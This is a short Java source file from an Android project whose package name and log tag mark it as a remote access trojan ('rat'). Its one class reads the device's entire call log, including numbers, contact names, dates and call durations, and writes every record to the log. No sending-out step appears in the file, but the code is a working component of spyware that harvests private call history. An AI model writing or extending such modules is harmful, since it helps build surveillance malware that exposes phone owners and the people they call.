package com.score.rat.Library;

import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.util.Log;

import com.score.rat.MainActivity;

public class CallLogLister {
    public static boolean ListCalls(MainActivity m){
        boolean ret = false;

        String WHERE_CONDITION = new String("*");
        String SORT_ORDER = "date DESC";
        String[] column = { "_id", "type", "date", "duration", "number","name" };

        Cursor cursor = m.getContentResolver().query(CallLog.Calls.CONTENT_URI, column, null, null, SORT_ORDER);

        if(cursor.getCount() != 0) {
            cursor.moveToFirst();

            do{
                if(cursor.getColumnCount() != 0) {
                    int id = cursor.getInt(cursor.getColumnIndex("_id"));
                    int type = cursor.getInt(cursor.getColumnIndex("type"));
                    long date = cursor.getLong(cursor.getColumnIndex("date"));
                    long duration = cursor.getLong(cursor.getColumnIndex("duration"));
                    String number  = cursor.getString(cursor.getColumnIndex("number"));
                    String name = cursor.getString(cursor.getColumnIndex("name"));
                    //int raw_contact_id = cursor.getInt(cursor.getColumnIndex("raw_contact_id"));
                    Log.d("RAT","CallLog");
                    Log.d("RAT","Call: " + id + " " + type + " " + date + " " + duration + " " + number + " " + name);

                }
            }while(cursor.moveToNext());
            ret = true;
        }
        else
            ret = false;

        return ret;
    }

}
